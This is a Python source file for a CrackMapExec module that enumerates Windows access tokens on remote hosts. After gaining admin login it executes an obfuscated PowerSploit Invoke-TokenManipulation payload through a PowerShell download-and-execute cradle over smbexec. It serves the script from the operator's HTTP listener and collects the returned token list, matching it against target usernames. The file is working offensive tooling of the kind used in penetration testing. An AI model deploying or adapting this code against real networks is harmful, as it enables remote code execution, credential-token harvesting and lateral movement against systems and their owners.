from cme.helpers.powershell import *
from datetime import datetime
from io import StringIO
import os
import sys

class CMEModule:
    '''
        Enumerates available tokens using Powersploit's Invoke-TokenManipulation
        Module by @byt3bl33d3r
    '''

    name = 'tokens'
    description = "Enumerates available tokens"
    supported_protocols = ['mssql', 'smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
            USER      Search for the specified username in available tokens (default: None)
            USERFILE  File containing usernames to search for in available tokens (defult: None)
        '''

        self.user = None
        self.userfile = None

        if 'USER' in module_options and 'USERFILE' in module_options:
            context.log.error('USER and USERFILE options are mutually exclusive!')
            sys.exit(1)

        if 'USER' in module_options:
            self.user = module_options['USER']

        elif 'USERFILE' in module_options:
            path = os.path.expanduser(module_options['USERFILE'])

            if not os.path.exists(path):
                context.log.error('Path to USERFILE invalid!')
                sys.exit(1)

            self.userfile = path

        self.ps_script = obfs_ps_script('powersploit/Exfiltration/Invoke-TokenManipulation.ps1')

    def on_admin_login(self, context, connection):
        command = "Invoke-TokenManipulation -Enumerate | Select-Object Domain, Username, ProcessId, IsElevated | Out-String"
        launcher = gen_ps_iex_cradle(context, 'Invoke-TokenManipulation.ps1', command)

        connection.ps_execute(launcher, methods=['smbexec'])
        context.log.success('Executed payload')

    def on_request(self, context, request):
        if 'Invoke-TokenManipulation.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script.encode())

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.get('content-length'))
        data = response.rfile.read(length).decode()

        #We've received the response, stop tracking this host
        response.stop_tracking_host()

        if len(data) > 0:

            def print_post_data(data):
                buf = StringIO(data.strip()).readlines()
                for line in buf:
                    context.log.highlight(line.strip())

            context.log.success('Enumerated available tokens')

            if self.user:
                if data.find(self.user) != -1:
                    context.log.success("Found token for user {}!".format(self.user))
                    print_post_data(data)

            elif self.userfile:
                with open(self.userfile, 'r') as userfile:
                    for user in userfile:
                        user = user.strip()
                        if data.find(user) != -1:
                            context.log.success("Found token for user {}!".format(user))
                            print_post_data(data)
                            break

            else:
                print_post_data(data)

            log_name = 'Tokens-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
            write_log(data, log_name)
            context.log.info("Saved output to {}".format(log_name))
